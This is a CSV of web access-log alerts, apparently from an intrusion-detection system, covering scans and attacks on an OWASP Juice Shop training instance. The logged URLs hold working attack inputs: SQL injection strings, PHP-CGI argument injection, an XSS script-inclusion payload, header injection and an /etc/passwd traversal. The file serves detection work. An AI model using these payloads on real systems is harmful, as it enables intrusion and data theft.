log_id,full_log,data.protocol,data.url,decoder.name,rule.description,rule.groups,rule.id,rule.level
623,"10.42.1.207 - - [13/May/2026:07:55:10 +0000] ""GET /rest/track-order?id=1%20OR%201%3D1 HTTP/1.1"" 200 305 ""https://juice-shop.vtsolutions.it/"" ""sqlmap/1.8.4#stable (https://sqlmap.org)""",GET,/rest/track-order?id=1%20OR%201%3D1,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
98,"10.42.0.234 - - [12/May/2026:16:20:26 +0000] ""TRACE /api/Challenges HTTP/1.1"" 500 - ""-"" ""-""",TRACE,/api/Challenges,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1008,"10.42.1.207 - - [12/May/2026:16:22:45 +0000] ""GET /rest/products HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
650,"10.42.0.234 - - [12/May/2026:15:32:44 +0000] ""POST /assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1207,"10.42.2.77 - - [13/May/2026:14:24:12 +0000] ""GET /rest/basket HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""curl/8.5.0""",GET,/rest/basket,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
974,"10.42.2.150 - - [12/May/2026:16:06:17 +0000] ""POST /rest/user/whoami HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/whoami,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
189,"10.42.2.150 - - [12/May/2026:15:34:51 +0000] ""GET /rest/products/search?q=+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+ HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
359,"10.42.0.234 - - [12/May/2026:16:20:23 +0000] ""TRACE /api/Feedbacks/ HTTP/1.1"" 500 - ""-"" ""-""",TRACE,/api/Feedbacks/,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
503,"10.42.0.234 - - [12/May/2026:16:17:54 +0000] ""GET /rest/admin/application-version.tar HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/admin/application-version.tar,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
424,"10.42.1.207 - - [12/May/2026:15:51:52 +0000] ""GET /rest/admin?name=abc HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin?name=abc,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1226,"10.42.1.150 - - [13/May/2026:02:19:28 +0000] ""GET /api/Users?email=%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20 HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15""",GET,/api/Users?email=%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
440,"10.42.2.150 - - [12/May/2026:16:12:55 +0000] ""GET /rest/products/search?q=%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2F10.42.1.84%3A44623%2F421273de-f347-4951-b3a0-8c4b9538914f%22%3E HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2F10.42.1.84%3A44623%2F421273de-f347-4951-b3a0-8c4b9538914f%22%3E,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
1159,"10.42.1.207 - - [12/May/2026:16:09:04 +0000] ""GET /rest/.htaccess HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/.htaccess,web-accesslog,Suspicious URL access.,"[""web"",""appsec"",""attack""]",31516,6
419,"10.42.1.207 - - [12/May/2026:15:32:33 +0000] ""GET /rest/admin/application-version?-s HTTP/1.1"" 200 20 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/admin/application-version?-s,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
545,"10.42.1.94 - - [13/May/2026:09:45:52 +0000] ""GET /.env HTTP/1.1"" 400 26 ""https://juice-shop.vtsolutions.it/"" ""Nikto/2.5.0""",POST,/.env,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
325,"10.42.2.150 - - [12/May/2026:16:08:44 +0000] ""GET /redirect?to=any%3F%0ASet-cookie%3A+Tamper%3D45bc40fd-cb4c-4822-8299-3ea7428b307c HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=any%3F%0ASet-cookie%3A+Tamper%3D45bc40fd-cb4c-4822-8299-3ea7428b307c,web-accesslog,Common web attack.,"[""web"",""accesslog"",""attack""]",31104,6
575,"10.42.2.150 - - [12/May/2026:15:34:37 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
87,"10.42.2.150 - - [12/May/2026:16:08:57 +0000] ""GET /rest/products/trace.axd HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/trace.axd,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
339,"10.42.1.207 - - [12/May/2026:15:32:44 +0000] ""POST /application/node_modules/serve-index/styles.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/serve-index/styles.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1477,"10.42.2.150 - - [12/May/2026:16:14:00 +0000] ""GET /api.backup HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api.backup,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
745,"10.42.0.234 - - [12/May/2026:15:32:34 +0000] ""POST /api/Quantitys/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 401 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/api/Quantitys/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
263,"10.42.0.234 - - [12/May/2026:16:09:27 +0000] ""GET /rest/products/search?q=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1043,"10.42.2.150 - - [12/May/2026:16:12:05 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
32,"10.42.0.234 - - [12/May/2026:16:20:13 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1267,"10.42.0.234 - - [12/May/2026:16:00:43 +0000] ""GET /api/Addresss HTTP/1.1"" 401 31 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Addresss,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
321,"10.42.2.150 - - [12/May/2026:15:32:56 +0000] ""POST /ru.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/ru.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
109,"10.42.1.207 - - [12/May/2026:16:17:54 +0000] ""GET /rest/admin%20-%20Copy%20(3) HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/admin%20-%20Copy%20(3),web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
950,"10.42.0.234 - - [12/May/2026:15:34:36 +0000] ""GET /api/Challenges/?name=Score+Board+and+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Challenges/?name=Score+Board+and+0+in+%28select+sleep%2815%29+%29+--+,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
1063,"10.42.0.234 - - [12/May/2026:15:34:36 +0000] ""GET /api/Challenges/?name=Score+Board%22+and+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Challenges/?name=Score+Board%22+and+0+in+%28select+sleep%2815%29+%29+--+,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
1188,"10.42.1.207 - - [12/May/2026:16:08:49 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
382,"10.42.0.234 - - [12/May/2026:16:18:35 +0000] ""GET /rest/products.log HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/products.log,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
249,"10.42.1.150 - - [12/May/2026:19:18:45 +0000] ""GET /api/Users?email=%27%20OR%201%3D1--%20 HTTP/1.1"" 200 - ""https://juice-shop.vtsolutions.it/"" ""sqlmap/1.8.4#stable (https://sqlmap.org)""",GET,/api/Users?email=%27%20OR%201%3D1--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
1336,"10.42.2.150 - - [12/May/2026:15:32:48 +0000] ""POST /assets/public/images/uploads/BeeHaven.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/uploads/BeeHaven.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1151,"10.42.0.234 - - [12/May/2026:15:32:24 +0000] ""GET /api/Feedbacks/?-s HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/Feedbacks/?-s,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1348,"10.42.2.150 - - [12/May/2026:19:25:15 +0000] ""GET /api/BasketItems/%27%3B%20DROP%20TABLE%20Users--%20 HTTP/1.1"" 500 314 ""https://juice-shop.vtsolutions.it/"" ""python-requests/2.32.3""",GET,/api/BasketItems/%27%3B%20DROP%20TABLE%20Users--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
1422,"10.42.0.234 - - [12/May/2026:16:14:12 +0000] ""GET /api/Quantitys.tar HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/Quantitys.tar,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
256,"10.42.0.234 - - [12/May/2026:15:32:46 +0000] ""POST /assets/public/images/carousel/5.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/carousel/5.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1004,"10.42.2.150 - - [12/May/2026:16:08:03 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
736,"10.42.2.150 - - [12/May/2026:16:11:57 +0000] ""GET /api/.git/index HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/.git/index,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
206,"10.42.0.234 - - [12/May/2026:15:34:32 +0000] ""GET /redirect?to=%27 HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%27,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sqlinjection"",""attack""]",31164,6
529,"10.42.0.234 - - [12/May/2026:16:06:51 +0000] ""POST /rest/user/login HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
549,"10.42.0.234 - - [12/May/2026:16:11:25 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
817,"10.42.2.150 - - [12/May/2026:16:11:25 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4""",GET,/rest/admin,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
270,"10.42.0.234 - - [12/May/2026:15:32:57 +0000] ""POST /socket.io?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/socket.io?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1233,"10.42.0.234 - - [12/May/2026:15:32:41 +0000] ""POST /application/node_modules/express/lib/router/index.js:280:10?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/express/lib/router/index.js:280:10?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
25,"10.42.1.195 - - [13/May/2026:00:59:46 +0000] ""GET /api/Orders HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)""",GET,/api/Orders,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
1448,"10.42.2.150 - - [12/May/2026:16:21:31 +0000] ""TRACE /rest/captcha HTTP/1.1"" 500 - ""-"" ""-""",TRACE,/rest/captcha,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
726,"10.42.1.207 - - [12/May/2026:15:34:15 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
731,"10.42.2.150 - - [12/May/2026:15:32:10 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
670,"10.42.0.234 - - [12/May/2026:16:08:39 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
820,"10.42.1.207 - - [12/May/2026:15:33:45 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
302,"10.42.0.234 - - [12/May/2026:15:34:45 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
932,"10.42.1.207 - - [13/May/2026:08:59:12 +0000] ""GET /redirect?to=%2F%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1"" 401 - ""https://juice-shop.vtsolutions.it/"" ""sqlmap/1.8.4#stable (https://sqlmap.org)""",GET,/redirect?to=%2F%2F..%2F..%2F..%2Fetc%2Fpasswd,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
